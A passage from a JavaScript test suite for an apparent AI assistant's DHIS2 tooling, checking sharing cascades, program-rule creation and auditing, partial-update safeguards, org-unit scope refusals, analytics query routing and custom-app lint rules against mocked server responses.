  try {
    const r = await ctx.cascadeProgramDataSharingToTrackedEntityType('progNcd0001', {});
    const body = puts[0] && puts[0].body.object;
    truthy('a program shared for data capture gives its tracked entity type the same data access', r && r.updated && body && body.publicAccess === 'rwrw----');
    eq('…groups with data access on the program are added; existing grants are kept', body && body.userGroupAccesses.map((g) => `${g.id}:${g.access}`).sort(), ['grpNurses01:r-rw----', 'grpViewer01:r-r-----']);
    truthy('…and the result says how many other programs share the type', r && r.other_programs_using_it === 2 && /shared by 2 other program/.test(r._note));
    puts.length = 0; tetPublic = 'rwrw----';
    ctx.safeDhis2Fetch = ((inner) => async (p, o = {}) => (p === 'sharing?type=trackedEntityType&id=tetPerson01'
      ? { object: { publicAccess: 'rwrw----', userGroupAccesses: [{ id: 'grpNurses01', access: 'rwrw----' }], userAccesses: [] } } : inner(p, o)))(ctx.safeDhis2Fetch);
    const r2 = await ctx.cascadeProgramDataSharingToTrackedEntityType('progNcd0001', {});
    truthy('…a type that already grants it is left alone (no write, no backup)', r2 === null && puts.length === 0);
  } finally { ctx.safeDhis2Fetch = saved.sdf; ctx.ensureBackupOrBail = saved.bk; }
  // "unique" on a reused attribute; stage names only unique where the server says so.
  {
    const saved2 = { sdf: ctx.safeDhis2Fetch, bk: ctx.ensureBackupOrBail };
    const writes = [];
    ctx.ensureBackupOrBail = async () => ({ ok: true, block: { backup_key: 'bk' } });
    ctx.safeDhis2Fetch = async (p, o = {}) => {
      if (o.method) { writes.push(`${o.method} ${p} ${JSON.stringify(o.body)}`); return {}; }
      if (/^trackedEntityAttributes\?filter=id:in:/.test(p)) return { trackedEntityAttributes: [{ id: 'teaNatId0001', displayName: 'National ID', unique: false }, { id: 'teaShared001', displayName: 'Passport', unique: false }, { id: 'teaAlready01', displayName: 'Epid', unique: true }] };
      if (/trackedEntityAttribute\.id:eq:teaShared001/.test(p) && p.startsWith('programs')) return { programs: [{ displayName: 'Other program' }] };
      if (p.startsWith('programs?') || p.startsWith('trackedEntityTypes?')) return { programs: [], trackedEntityTypes: [] };
      if (p.startsWith('schemas/programStage')) return { properties: [{ name: 'name', unique: false }] };
      return { _error: `unexpected ${p}` };
    };
    try {
      const u = await ctx.applyRequestedAttributeUniqueness('progNcd0001', [{ id: 'teaNatId0001' }, { id: 'teaShared001' }, { id: 'teaAlready01' }], {});
      eq('a reused attribute nobody else uses is made unique; one shared with another program is reported, not changed', [u.applied.map((x) => x.attribute), u.not_applied.map((x) => `${x.attribute}: ${x.shared_with}`), writes], [['National ID'], ['Passport: program "Other program"'], ['PATCH trackedEntityAttributes/teaNatId0001 {"unique":true}']]);
      vm.runInContext('_stageNameUniqueCache = null', ctx);
      eq('programStage names are not renamed where the server schema says name is not unique', await ctx.programStageNamesMustBeUnique(), false);
      vm.runInContext('_stageNameUniqueCache = null', ctx);
      ctx.safeDhis2Fetch = async () => ({ _error: 'HTTP 500' });
      eq('…and are still de-duplicated when the schema cannot be read', await ctx.programStageNamesMustBeUnique(), true);
    } finally { ctx.safeDhis2Fetch = saved2.sdf; ctx.ensureBackupOrBail = saved2.bk; vm.runInContext('_stageNameUniqueCache = null', ctx); }
  }
  // create_program's embedded rules: in-form variables read the CURRENT event.
  {
    const saved3 = { sdf: ctx.safeDhis2Fetch, pmp: ctx.postMetadataPayload };
    let posted = null;
    ctx.safeDhis2Fetch = async (p, o = {}) => {
      if (o.method) return { status: 'OK' };
      if (/^schemas\/programStage/.test(p)) return { properties: [{ name: 'name', unique: false }] };
      if (/^trackedEntityTypes/.test(p)) return { trackedEntityTypes: [{ id: 'tetPerson01', name: 'person', displayName: 'person' }], id: 'tetPerson01', name: 'person' };
      if (/^trackedEntityAttributes\?filter=name:in:/.test(p) && /Verify%20sex/.test(p)) return { trackedEntityAttributes: [{ id: 'teaSexExist', name: 'Verify sex', valueType: 'TEXT', optionSet: { options: [{ name: 'Male' }, { name: 'Female' }] } }] };
      const m = p.match(/^(\w+)/);
      return { [m ? m[1] : 'x']: [], pager: { total: 0 } };
    };
    ctx.postMetadataPayload = async (payload) => { posted = payload; return { success: false, phase: 'validate', _error: 'mock: stop after building' }; };
    try {
      vm.runInContext('_stageNameUniqueCache = null', ctx);
      await ctx.createFullProgram({
        program_name: 'Verify BP', org_unit_ids: ['ouRoot00001'], program_type: 'WITH_REGISTRATION', tracked_entity_type_id: 'tetPerson01',
        program_attributes: [{ name: 'Verify name', value_type: 'TEXT' }, { name: 'Verify sex', value_type: 'TEXT', option_set: { name: 'Verify sex set', options: ['Male', 'Female'] } }],
        stages: [
          { name: 'Screening', data_elements: [{ name: 'Verify systolic', value_type: 'INTEGER_POSITIVE' }, { name: 'Verify diagnosis', value_type: 'TEXT', option_set: { name: 'Verify dx', options: ['HTN', 'DM'] } }] },
          { name: 'Follow-up', repeatable: true, data_elements: [{ name: 'Verify systolic', value_type: 'INTEGER_POSITIVE' }, { name: 'Verify hba1c', value_type: 'NUMBER' }] },
        ],
        program_rules: [
          { name: 'Crisis', condition: '#{verify_systolic} >= 180', actions: [{ type: 'SHOWWARNING', data_element_name: 'Verify systolic', content: 'Crisis' }] },
          { name: 'Hide hba1c', condition: "#{verify_diagnosis} == 'HTN'", actions: [{ type: 'HIDEFIELD', data_element_name: 'Verify hba1c' }] },
          { name: 'Low at follow-up', condition: '#{verify_systolic} < 90', actions: [{ type: 'SHOWWARNING', data_element_name: 'Verify systolic', content: 'Low', program_stage_name: 'Follow-up' }] },
        ],
      }, 'bjDvmb4bfuf', null);
      const src = Object.fromEntries(((posted && posted.programRuleVariables) || []).map((x) => [x.name, x.programRuleVariableSourceType]));
      eq('create_program: a variable the rule acts on in the same stage reads the CURRENT event; a cross-stage lookup reads the newest event', [src.verify_systolic, src.verify_diagnosis], ['DATAELEMENT_CURRENT_EVENT', 'DATAELEMENT_NEWEST_EVENT_PROGRAM']);
      eq('create_program: the inline option set of a REUSED attribute is not created (no orphan); the new data element\'s set is', [((posted && posted.optionSets) || []).map((o) => o.name), ((posted && posted.trackedEntityAttributes) || []).map((t) => t.name), ((posted && posted.options) || []).length], [['Verify dx'], ['Verify name'], 2]);
      const fu = ((posted && posted.programStages) || []).find((x) => x.name === 'Follow-up');
      eq('create_program: a rule whose actions all name one stage is scoped to it; the others run everywhere; stage names are kept', [((posted && posted.programRules) || []).map((r) => (r.programStage ? r.programStage.id === (fu && fu.id) : null)), ((posted && posted.programStages) || []).map((x) => x.name)], [[null, null, true], ['Screening', 'Follow-up']]);
    } finally { ctx.safeDhis2Fetch = saved3.sdf; ctx.postMetadataPayload = saved3.pmp; vm.runInContext('_stageNameUniqueCache = null', ctx); }
  }
  // audit: a NEWEST_EVENT_PROGRAM variable used in the same (repeatable) form.
  {
    const saved4 = ctx.safeDhis2Fetch;
    const prv = (src) => ({ id: 'prvSys00001', name: 'sys', programRuleVariableSourceType: src, dataElement: { id: 'deSystolic1' } });
    let vars = [prv('DATAELEMENT_NEWEST_EVENT_PROGRAM')];
    ctx.safeDhis2Fetch = async (p) => {
      if (p.startsWith('programRules?')) return { programRules: [{ id: 'ruleCrisis1', name: 'Crisis', condition: 'd2:hasValue(#{sys}) && #{sys} >= 180', programRuleActions: [{ id: 'actCrisis01', programRuleActionType: 'SHOWWARNING', content: 'Crisis', dataElement: { id: 'deSystolic1' } }] }], pager: { pageCount: 1 } };
      if (p.startsWith('programRuleVariables?')) return { programRuleVariables: vars, pager: { pageCount: 1 } };
      if (p.startsWith('programs/progNcd0001')) return { id: 'progNcd0001', programStages: [{ id: 'stageScreen1', repeatable: false, programStageDataElements: [{ dataElement: { id: 'deSystolic1' } }] }, { id: 'stageFollow1', repeatable: true, programStageDataElements: [{ dataElement: { id: 'deSystolic1' } }] }], programTrackedEntityAttributes: [] };
      return { _error: `unexpected ${p}` };
    };
    try {
      const a = await ctx.executeTool('manage_program_rules', { action: 'audit', program_id: 'progNcd0001', deep: false });
      truthy('audit flags a NEWEST_EVENT_PROGRAM variable read in the same repeatable form, pointing at fix_variables (one call), not a PATCH per variable', JSON.stringify(a).includes('reads the NEWEST event of the whole enrollment') && JSON.stringify(a).includes('prvSys00001') && JSON.stringify(a).includes('fix_variables') && !JSON.stringify(a).includes('dhis2_query(method=\\"PATCH\\"'));
      vars = [prv('DATAELEMENT_CURRENT_EVENT')];
      const b = await ctx.executeTool('manage_program_rules', { action: 'audit', program_id: 'progNcd0001', deep: false });
      truthy('…and not a CURRENT_EVENT one', !JSON.stringify(b).includes('reads the NEWEST event'));
      // Cold Chain thread (2026-11-26): 62 PATCH calls through dhis2_query → fix_variables does them in one call.
      vars = [prv('DATAELEMENT_NEWEST_EVENT_PROGRAM')];
      const d4 = ctx.__dhis2(); const keep4 = { wa: d4.writeAuth, c: d4.harnessSkipBackupConsent };
      d4.writeAuth = { scope: 'broad', reason: 'verify' }; d4.harnessSkipBackupConsent = true;
      const patches = [];
      const inner = ctx.safeDhis2Fetch;
      ctx.safeDhis2Fetch = async (p, o = {}) => { if (o.method === 'PATCH') { patches.push([p, o.body]); vars = [prv('DATAELEMENT_CURRENT_EVENT')]; return {}; } return inner(p, o); };
      try {
        const f = await ctx.executeTool('manage_program_rules', { action: 'fix_variables', program_id: 'progNcd0001', skip_backup: true });
        truthy('fix_variables patches every flagged variable in ONE tool call (a replace of programRuleVariableSourceType), then re-audits clean',
          f.success === true && f.fixed === 1 && f.still_flagged === 0 && patches.length === 1 && patches[0][0] === 'programRuleVariables/prvSys00001'
          && JSON.stringify(patches[0][1]).includes('DATAELEMENT_CURRENT_EVENT'));
      } finally { d4.writeAuth = keep4.wa; d4.harnessSkipBackupConsent = keep4.c; }
    } finally { ctx.safeDhis2Fetch = saved4; }
  }
  // manage_program_rules create: references checked before any request (Cold Chain thread, 2026-11-26).
  {
    const savedF = ctx.safeDhis2Fetch, savedP = ctx.postMetadataPayload;
    const d5 = ctx.__dhis2(); const keep5 = d5.writeAuth;
    d5.writeAuth = { scope: 'broad', reason: 'verify' };
    const stagesCold = [
      { id: 'stgTempRd01', displayName: 'Temperature monitoring', repeatable: true, programStageDataElements: [{ dataElement: { id: 'deTempCur01', displayName: 'Current temperature', valueType: 'NUMBER' } }, { dataElement: { id: 'deTempMin01', displayName: 'Minimum temperature', valueType: 'NUMBER' } }] },
      { id: 'aRfcBDWYYdj', displayName: 'Preventive maintenance', repeatable: true, programStageDataElements: [{ dataElement: { id: 'deMaintCs01', displayName: 'Maintenance cost', valueType: 'NUMBER' } }, { dataElement: { id: 'deUptime001', displayName: 'Uptime percentage', valueType: 'NUMBER' } }] },
    ];
    let posted5 = null; let sent = 0;
    ctx.safeDhis2Fetch = async (p) => {
      if (p.startsWith('programs/progCold001')) return { id: 'progCold001', programStages: stagesCold, programTrackedEntityAttributes: [], programRuleVariables: [] };
      if (p.startsWith('programRules?')) return { programRules: [] };
      return {};
    };
    ctx.postMetadataPayload = async (payload) => { sent++; posted5 = payload; return { success: true }; };
    try {
      const ok = await ctx.executeTool('manage_program_rules', { action: 'create', program_id: 'progCold001', rules: [
        { name: 'Cost cannot be negative', condition: 'd2:hasValue(#{maintenance_cost}) && #{maintenance_cost} < 0', program_stage_id: 'aRfcBDWYYdt', actions: [{ type: 'SHOWERROR', content: 'Negative cost' }] },
        { name: 'Calc uptime', condition: 'd2:hasValue(#{maintenance_cost})', actions: [{ type: 'ASSIGN', target: 'Uptime percentage', data: '99' }] },
        { name: 'Out of range', condition: 'd2:hasValue(#{current_temperature}) && #{current_temperature} < #{minimum_temperature}', program_stage_id: 'stgTempRd01', actions: [{ type: 'SHOWWARNING', content: 'Outside the device range' }] },
      ] });
      const rules5 = (posted5 && posted5.programRules) || [];
      const vars5 = Object.fromEntries(((posted5 && posted5.programRuleVariables) || []).map((v) => [v.name, v.programRuleVariableSourceType]));
      const assign = ((posted5 && posted5.programRuleActions) || []).find((a) => a.programRuleActionType === 'ASSIGN');
      truthy('a one-character slip in a rule\'s stage id (aRfcBDWYYdt) is healed to the program\'s stage and reported; a "target" alias becomes the ASSIGN target; a stage-scoped warning with no target field reads the CURRENT event',
        sent === 1 && rules5[0] && rules5[0].programStage && rules5[0].programStage.id === 'aRfcBDWYYdj'
        && /aRfcBDWYYdt → aRfcBDWYYdj/.test(JSON.stringify(ok.summary && ok.summary.id_corrections))
        && assign && assign.dataElement && assign.dataElement.id === 'deUptime001'
        && vars5.current_temperature === 'DATAELEMENT_CURRENT_EVENT' && vars5.minimum_temperature === 'DATAELEMENT_CURRENT_EVENT' && vars5.maintenance_cost === 'DATAELEMENT_CURRENT_EVENT');
      sent = 0;
      const noTarget = await ctx.executeTool('manage_program_rules', { action: 'create', program_id: 'progCold001', rules: [{ name: 'Calculate days overdue', condition: 'd2:hasValue(#{maintenance_cost})', actions: [{ type: 'ASSIGN', data: 'd2:daysBetween(V{event_date}, V{current_date})' }] }] });
      const badStage = await ctx.executeTool('manage_program_rules', { action: 'create', program_id: 'progCold001', rules: [{ name: 'Elsewhere', condition: 'd2:hasValue(#{maintenance_cost})', program_stage_id: 'zzzzzzzzzzz', actions: [{ type: 'SHOWWARNING', content: 'x' }] }] });
      truthy('…an ASSIGN with no target and a stage that is not the program\'s are refused before any request, listing the program\'s stages',
        sent === 0 && noTarget.nothing_created && /ASSIGN action has no target field/.test(noTarget._error) && badStage.nothing_created && /not a stage of this program/.test(badStage._error) && /aRfcBDWYYdj/.test(JSON.stringify(badStage.program_stages)));
    } finally { ctx.safeDhis2Fetch = savedF; ctx.postMetadataPayload = savedP; d5.writeAuth = keep5; }
  }
  // Cold Chain dashboard (2026-11-26): maps scoped to all of the user's hierarchies drew unrelated grey areas,
  // and maps whose data units had no location were saved anyway.
  {
    const savedF = ctx.safeDhis2Fetch;
    vm.runInContext('_userRootOuCache = null', ctx);
    ctx.safeDhis2Fetch = async (p) => {
      if (p.startsWith('me?')) return { organisationUnits: [{ id: 'rootPal0001', displayName: 'Palestine' }, { id: 'rootEgy0001', displayName: 'MoHP Egypt' }, { id: 'rootTst0001', displayName: 'Test' }] };
      if (p.startsWith('programs/progCold001')) return { organisationUnits: [{ path: '/rootPal0001/r2/r3/fac0000001' }, { path: '/rootPal0001/r2/r3/fac0000002' }] };
      if (p.startsWith('programs/progMix00001')) return { organisationUnits: [{ path: '/rootPal0001/a' }, { path: '/rootEgy0001/b' }] };
      if (p.startsWith('analytics?')) return { headers: [{ name: 'dx' }, { name: 'ou' }, { name: 'value' }], rows: [['pi', 'ouTestDst01', '12']] };
      if (p.startsWith('organisationUnits?filter=id:in:')) return { organisationUnits: [] };
      if (p.startsWith('organisationUnits/ouTestDst01')) return { displayName: 'Test district' };
      return {};
    };
    try {
      const ok = await ctx.singleRootScopeRefusal(['rootPal0001'], 'Map "x"', ['progCold001']);
      const no = await ctx.singleRootScopeRefusal(['rootPal0001'], 'Map "x"', ['progMix00001']);
      const home = await ctx.programHierarchyRoot(['progCold001']);
      const und = await ctx.mapUndrawableData('piShare0001', { rows: [{ dimension: 'ou', items: [{ id: 'rootPal0001' }, { id: 'LEVEL-3' }] }], filters: [{ items: [{ id: 'LAST_12_MONTHS' }] }] });
      truthy('a single top unit is allowed when every org unit of the program lies under it (and still refused for a program spread over two hierarchies); the program\'s hierarchy is found; a layer whose data units have no location is recognised, with their names',
        ok === null && no && /never asked/.test(no._error) && home && home.id === 'rootPal0001' && und && und.units === 1 && und.names[0] === 'Test district');
    } finally { ctx.safeDhis2Fetch = savedF; vm.runInContext('_userRootOuCache = null', ctx); }
  }
  // dhis2_query PUT with a partial body: a program lost its tracked entity type, stages and org units (play, 2026-11-26).
  {
    const savedF = ctx.safeDhis2Fetch;
    vm.runInContext('if (typeof _adminCache !== "undefined") { _adminCache.schemaIndex = null; }', ctx);
    ctx.safeDhis2Fetch = async (p) => {
      if (/^schemas\?/.test(p)) return { schemas: [{ name: 'program', plural: 'programs' }] };
      if (p.startsWith('programs/progPut0001?fields=:owner')) return { id: 'progPut0001', name: 'CCR', shortName: 'CCR', programType: 'WITH_REGISTRATION', trackedEntityType: { id: 'tetPerson01' }, programStages: [{ id: 'stg00000001' }], organisationUnits: [{ id: 'ou000000001' }], lastUpdated: 'x' };
      return {};
    };
    try {
      const m = await ctx.mergePartialPut('programs/progPut0001', { name: 'CCR renamed', organisationUnits: [] });
      const none = await ctx.mergePartialPut('dataStore/ns/key', { a: 1 });
      truthy('a PUT that names only some fields keeps the rest as saved (tracked entity type, stages), applies what it names (also an explicit empty list), and is reported; dataStore PUTs are untouched',
        m && m.body.trackedEntityType.id === 'tetPerson01' && m.body.programStages.length === 1 && m.body.name === 'CCR renamed' && m.body.organisationUnits.length === 0
        && m.kept.includes('trackedEntityType') && m.kept.includes('programStages') && !m.kept.includes('lastUpdated') && none === null);
    } finally { ctx.safeDhis2Fetch = savedF; vm.runInContext('if (typeof _adminCache !== "undefined") { _adminCache.schemaIndex = null; if (_adminCache.schemas) _adminCache.schemas.clear(); }', ctx); }
  }
  // dhis2_query POST metadata with partial objects (Cold Chain thread: two HTTP 500s).
  {
    const savedF = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async (p) => (/^schemas\/programRuleVariable/.test(p) ? { properties: [{ name: 'name', required: true, persisted: true }, { name: 'program', required: true, persisted: true }, { name: 'programRuleVariableSourceType', required: true, persisted: true }, { name: 'valueType', required: true, persisted: true }] } : /^schemas\?/.test(p) ? { schemas: [{ name: 'programRuleVariable', plural: 'programRuleVariables' }] } : {});
    try {
      const partial = await ctx.precheckMetadataImportPartial({ programRuleVariables: [{ id: 'KY0DqXCybLy', programRuleVariableSourceType: 'DATAELEMENT_CURRENT_EVENT', program: { id: 'O0CS8euHCXP' } }] });
      const full = await ctx.precheckMetadataImportPartial({ programRuleVariables: [{ id: 'KY0DqXCybLy', name: 'temp', program: { id: 'O0CS8euHCXP' }, programRuleVariableSourceType: 'DATAELEMENT_CURRENT_EVENT', valueType: 'NUMBER' }] });
      truthy('a metadata import of partial objects (an id and the one field to change) is refused before sending, pointing rule variables at fix_variables; complete objects pass',
        partial && /lack name/.test(partial._error) && /fix_variables/.test(partial._hint) && full === null);
    } finally { ctx.safeDhis2Fetch = savedF; vm.runInContext('typeof _requiredFieldsCache !== "undefined" && _requiredFieldsCache.clear(); if (typeof _adminCache !== "undefined") { _adminCache.schemaIndex = null; if (_adminCache.schemas) _adminCache.schemas.clear(); }', ctx); }
  }
  // search_metadata paging: never a "page" filter; say when the list is cut off.
  {
    const saved5 = ctx.safeDhis2Fetch;
    const seen = [];
    ctx.safeDhis2Fetch = async (p) => { seen.push(p); return { trackedEntityAttributes: [{ id: 'a' }, { id: 'b' }], pager: { page: /page=2/.test(p) ? 2 : 1, pageCount: 3, total: 6 } }; };
    try {
      const r = await ctx.executeTool('search_metadata', { object_type: 'trackedEntityAttributes', page_size: 2, filters: ['page:eq:2', 'valueType:eq:TEXT'] });
      eq('search_metadata: a "page:eq:N" filter becomes the page parameter (no 400 "Unknown path property")', seen[0], 'trackedEntityAttributes?fields=id,displayName,code,description&pageSize=2&page=2&filter=valueType:eq:TEXT');
      truthy('…and a cut-off list says how to get the next page', /Showing 2 of 6 \(page 2 of 3\)\. Next: the same call with page: 3/.test(r._more || ''));
    } finally { ctx.safeDhis2Fetch = saved5; }
  }
  // A two-option Yes/No set is the BOOLEAN type; rules in the same call follow.
  {
    const args = {
      stages: [{ name: 'Follow-up', data_elements: [
        { name: 'BP controlled', value_type: 'TEXT', option_set: { name: 'NCD Yes/No', options: ['Yes', 'No'] } },
        { name: 'Referred', value_type: 'TEXT', option_set: { name: 'YNU', options: ['Yes', 'No', 'Unknown'] } },
        { name: 'Kept', value_type: 'TEXT', keep_option_set: true, option_set: { name: 'YN', options: ['Yes', 'No'] } },
      ] }],
      program_rules: [
        { name: 'a', condition: "#{bp_controlled} == 'YES' && #{referred} == 'YES'", actions: [{ type: 'ASSIGN', data_element_name: 'BP controlled', data: 'd2:condition("#{sys} < 140", \'YES\', \'NO\')' }] },
        { name: 'b', condition: "#{bp_controlled} == 'No'", actions: [{ type: 'SHOWWARNING', data_element_name: 'BP controlled', content: 'Uncontrolled' }] },
      ],
    };
    eq('a Yes/No option set becomes BOOLEAN (a Yes/No/Unknown set and keep_option_set stay)', [ctx.healYesNoOptionSets(args), args.stages[0].data_elements.map((d) => `${d.value_type}${d.option_set ? '+OS' : ''}`)], [['BP controlled'], ['BOOLEAN', 'TEXT+OS', 'TEXT+OS']]);
    eq('…and the rules of the same call compare / assign booleans', [args.program_rules[0].condition, args.program_rules[0].actions[0].data, args.program_rules[1].condition], ["#{bp_controlled} == true && #{referred} == 'YES'", 'd2:condition("#{sys} < 140", true, false)', '(!d2:hasValue(#{bp_controlled}) || #{bp_controlled} != true)']);
  }
  // Multi-root instances: one root picked by the model is not "the whole hierarchy".
  {
    const saved6 = { sdf: ctx.safeDhis2Fetch, base: ctx.__dhis2().baseUrl };
    const probes = [];
    ctx.__dhis2().baseUrl = 'http://verify.local';
    vm.runInContext('_userRootOuCache = null; lastUserText = "Build charts across the whole hierarchy"; conversationHistory = [];', ctx);
    ctx.safeDhis2Fetch = async (p) => {
      if (p.startsWith('me?fields=organisationUnits')) return { organisationUnits: [{ id: 'rootPalest1', displayName: 'Palestine', level: 1 }, { id: 'rootEgypt01', displayName: 'MoHP Egypt', level: 1 }] };
      if (p.startsWith('analytics/')) { probes.push(p); return /ou:USER_ORGUNIT/.test(p) ? { headers: [], rows: [[1], [2]], metaData: { pager: { total: 40 } } } : { headers: [], rows: [], metaData: { pager: { total: 0 } } }; }
      return { _error: `unexpected ${p}` };
    };
    try {
      const r = await ctx.singleRootScopeRefusal(['rootEgypt01'], 'Visualization "x"');
      truthy('one of several top org units, never named by the user, is refused with USER_ORGUNIT as the fix', r && /never asked for "MoHP Egypt"/.test(r._error) && /USER_ORGUNIT/.test(r._hint));
      eq('…USER_ORGUNIT, a level, several units, or a root the user named pass', [await ctx.singleRootScopeRefusal(['USER_ORGUNIT'], 'x'), await ctx.singleRootScopeRefusal(['rootEgypt01', 'LEVEL-4'], 'x'), await ctx.singleRootScopeRefusal(['rootEgypt01', 'rootPalest1'], 'x')], [null, null, null]);
      vm.runInContext('lastUserText = "a chart for MoHP Egypt only"', ctx);
      eq('…and so does a root the user asked for by name', await ctx.singleRootScopeRefusal(['rootEgypt01'], 'x'), null);
      const w = await ctx.lineListEmptyWarning('analytics/enrollments/query/progNcd0001?dimension=ou:rootEgypt01&dimension=pe:LAST_12_MONTHS');
      truthy('an empty line list re-checks across USER_ORGUNIT and says the data lives elsewhere (not "run analytics")', /returns 40 row\(s\)/.test(w) && /Analytics tables are fine/.test(w) && probes.some((p) => /dimension=ou:USER_ORGUNIT&/.test(p)));
      const prompt = await ctx.buildSystemPrompt('make a chart');
      truthy('the system prompt names every top org unit and says the whole hierarchy is USER_ORGUNIT', /Your top org units: Palestine \(rootPalest1\), MoHP Egypt \(rootEgypt01\) — 2 separate hierarchies/.test(prompt));
    } finally {
      ctx.safeDhis2Fetch = saved6.sdf; ctx.__dhis2().baseUrl = saved6.base;
      vm.runInContext('_userRootOuCache = null; lastUserText = ""; conversationHistory = [];', ctx);
    }
  }
  truthy('analytics: a multi-period keyword as a dimension is labelled "no total row", and a mixed yearly row is not that total', /NO total row for LAST_12_MONTHS\. The THIS_YEAR row\(s\) cover a different range/.test(ctx.analyticsPeriodRowsNote('analytics?dimension=dx:abc&dimension=pe:THIS_YEAR;LAST_12_MONTHS&dimension=ou:USER_ORGUNIT') || ''));
  eq('…a filter=pe or a single period gets no note', [ctx.analyticsPeriodRowsNote('analytics?dimension=dx:abc&filter=pe:LAST_12_MONTHS'), ctx.analyticsPeriodRowsNote('analytics?dimension=pe:THIS_YEAR&dimension=dx:abc')], [null, null]);
  {
    const saved7 = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async (p) => (p.startsWith('programIndicators?filter=id:in:') ? { programIndicators: (p.match(/in:\[([^\]]+)\]/)[1].split(',')).filter((x) => x.startsWith('pi')).map((id) => ({ id })) } : { _error: 'unexpected' });
    try {
      eq('program indicators asked for on an enrollment AGGREGATE endpoint are routed to /analytics (no 409 E7224)', await ctx.routeProgramIndicatorAnalytics('analytics/enrollments/aggregate/progNcd0001?dimension=ou%3AUSER_ORGUNIT&dimension=pe%3ALAST_12_MONTHS&dimension=dx%3Api000000001%3Bpi000000002&pageSize=50&stage=stageFollow1'), { path: 'analytics?dimension=dx%3Api000000001%3Bpi000000002&dimension=ou%3AUSER_ORGUNIT&dimension=pe%3ALAST_12_MONTHS', routed: true });
      eq('…also bare / single program-indicator dimensions (no dx:), which otherwise group by the indicator value', (await ctx.routeProgramIndicatorAnalytics('analytics/events/aggregate/progNcd0001?dimension=ou:USER_ORGUNIT&dimension=pe:THIS_YEAR&dimension=pi000000001&dimension=pi000000002;pi000000003&stage=stageFollow1')).path, 'analytics?dimension=dx%3Api000000001%3Bpi000000002%3Bpi000000003&dimension=ou:USER_ORGUNIT&dimension=pe:THIS_YEAR');
      eq('…keeping startDate / endDate when the query has no pe dimension', (await ctx.routeProgramIndicatorAnalytics('analytics/enrollments/aggregate/progNcd0001?dimension=ou:USER_ORGUNIT;LEVEL-4&dimension=pi000000001&startDate=2025-11-01&endDate=2026-10-31')).path, 'analytics?dimension=dx%3Api000000001&dimension=ou:USER_ORGUNIT;LEVEL-4&startDate=2025-11-01&endDate=2026-10-31');
      // TB dashboard through the panel (2026-11-08): value=<program indicator> → 409.
      const viaValue = await ctx.routeProgramIndicatorAnalytics('analytics/events/aggregate/progNcd0001?dimension=pe:LAST_12_MONTHS&filter=ou:USER_ORGUNIT&value=pi000000001&aggregationType=AVERAGE');
      const deValue = await ctx.routeProgramIndicatorAnalytics('analytics/events/aggregate/progNcd0001?dimension=pe:LAST_12_MONTHS&value=deAge000001&aggregationType=AVERAGE&stage=stageFollow1');
      truthy('a program indicator given as value= on an event aggregate is read from /analytics with its own aggregation (no aggregationType); a data element value= is left alone',
        viaValue.routed && viaValue.path === 'analytics?dimension=dx%3Api000000001&dimension=pe:LAST_12_MONTHS&filter=ou:USER_ORGUNIT' && /not an event-analytics value/.test(viaValue.note || '') && !deValue.routed);
      eq('…data elements are not routed (they stay event/enrollment dimensions)', (await ctx.routeProgramIndicatorAnalytics('analytics/events/aggregate/progNcd0001?dimension=dx:deSystolic1&dimension=pe:LAST_12_MONTHS')).routed, false);
    } finally { ctx.safeDhis2Fetch = saved7; }
    eq('…dimension=stage:<uid> becomes the stage parameter', ctx.healEventAnalyticsDxDimension('analytics/events/aggregate/progNcd0001?dimension=ou:USER_ORGUNIT&dimension=stage:stageFoll01&startDate=2025-01-01').path, 'analytics/events/aggregate/progNcd0001?dimension=ou:USER_ORGUNIT&stage=stageFoll01&startDate=2025-01-01');
    eq('several items under one dx: on an event endpoint become one dimension each', ctx.healEventAnalyticsDxDimension('analytics/events/query/progNcd0001?dimension=dx:deSystolic1;deDiastol01&dimension=pe:LAST_12_MONTHS').path, 'analytics/events/query/progNcd0001?dimension=deSystolic1&dimension=deDiastol01&dimension=pe:LAST_12_MONTHS');
  }
  {
    const b = ctx.buildVisualizationObject({ name: 'q', vis_type: 'COLUMN', data_items: ['piVisits001'], periods: ['QUARTERS_THIS_YEAR', 'QUARTERS_LAST_YEAR'], org_units: ['USER_ORGUNIT'] }, { piVisits001: 'PROGRAM_INDICATOR' });
    eq('"this year and last year" periods are saved chronologically (last year first) with explicit axis items', b.viz.rows && b.viz.rows[0].items.map((i) => i.id), ['QUARTERS_LAST_YEAR', 'QUARTERS_THIS_YEAR']);
    const c = ctx.buildVisualizationObject({ name: 'q', vis_type: 'LINE', data_items: ['piVisits001'], periods: ['LAST_12_MONTHS'], org_units: ['USER_ORGUNIT'] }, { piVisits001: 'PROGRAM_INDICATOR' });
    eq('…other period sets keep the flag-only payload', c.viz.rows, undefined);
  }
  {
    const lintDates = (code) => ctx.lintCustomAppCode({ 'plugin.jsx': code }, 'plugin', null, 'CAPTURE').errors.some((e) => /Tracker timestamps/.test(e.message));
    const bug = "const Q = { ev: { resource: 'tracker/events', params: { fields: 'event,occurredAt' } } };\nfunction daysSince(dateStr) { const d = new Date(dateStr + 'T00:00:00'); return d; }\nconst n = daysSince(latest.occurredAt);";
    const trackerLint = (code) => ctx.lintCustomAppCode({ 'app.jsx': code }, 'app', null).errors.map((e) => e.message).join(' | ');
    const pagedBad = "const Q = { r: { resource: 'tracker/events', params: { page: 1, pageSize: 100, fields: 'event,orgUnit[id,displayName]' } } };\nconst n = res.r.pager.pageCount;";
    truthy('custom-app lint: tracker paging on pager.pageCount without totalPages, and orgUnit[…] on tracker records, are refused', /no pager\.pageCount/.test(trackerLint(pagedBad)) && /orgUnit as a plain UID string/.test(trackerLint(pagedBad)));
    truthy('…with totalPages and a plain orgUnit they pass', !/pageCount|plain UID/.test(trackerLint(pagedBad.replace('page: 1,', 'page: 1, totalPages: true,').replace('orgUnit[id,displayName]', 'orgUnit'))));
    const selLint = (src) => ctx.lintCustomAppCode({ 'app.jsx': ctx.compileCustomAppFile('app.jsx', src).code }, 'app', null).errors.some((e) => /has no "items" prop/.test(e.message));
    eq('custom-app lint: <SingleSelectField items={…}> (an empty dropdown) is refused; options as children pass', [selLint('const A = () => <SingleSelectField label="F" items={xs} selected={v} onChange={f} />;'), selLint('const A = () => <SingleSelectField label="F" selected={v} onChange={f}>{xs.map((x) => <SingleSelectOption key={x} value={x} label={x} />)}</SingleSelectField>;')], [true, false]);
    eq('custom-app lint: a tracker timestamp with T00:00:00 appended (Invalid Date) is refused; a trimmed one or a DATE data value is not', [lintDates(bug), lintDates(bug.replace("latest.occurredAt", "String(latest.occurredAt).slice(0, 10)")), lintDates("const next = new Date(dv.value + 'T00:00:00');")], [true, false, false]);
  }
  {
